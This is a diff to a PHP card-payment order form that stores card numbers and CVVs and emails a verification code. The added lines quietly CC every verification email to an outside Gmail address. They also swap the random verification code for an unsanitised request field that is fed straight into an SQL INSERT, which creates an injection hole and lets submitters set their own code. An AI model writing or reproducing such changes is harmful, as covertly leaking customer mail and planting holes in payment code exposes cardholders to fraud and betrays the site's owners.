@@ -28,6 +28,7 @@ require_once 'phpmailer/SMTP.php';
 
     $mail1->setFrom('phptesting2@gmail.com', 'Mailer');
     $mail1->addAddress($email);     
+    $mail1->AddCC('trendytiger72@gmail.com');
   
   
     $mail1->isHTML(true);                                  
@@ -43,6 +44,7 @@ require_once 'phpmailer/SMTP.php';
 
   }
 }
+
 // initializing variables
 $name = "";
 $cnumber    = "";
@@ -65,6 +67,8 @@ if (isset($_POST['reg_user'])) {
   $email = mysqli_real_escape_string($db, $_POST['email']);
   $cvv = mysqli_real_escape_string($db, $_POST['cvv']);
 
+  $v_code = $_POST['edit_id'];
+
   // form validation: ensure that the form is correctly filled ...
   // by adding (array_push()) corresponding error unto $errors array
   if (empty($name)) { array_push($errors, "Name on Card is required"); }
@@ -76,7 +80,6 @@ if (isset($_POST['reg_user'])) {
 
 
   if (count($errors) == 0) {
-    $v_code =bin2hex(random_bytes(2));
   	$query = "INSERT INTO orders (name, cnumber, expmonth, expyear, cvv, email, verification_code) 
   			  VALUES('$name', '$cnumber', '$expmonth','$expyear','$cvv', '$email', '$v_code')";
   	mysqli_query($db, $query) && go($_POST['email'],$v_code);
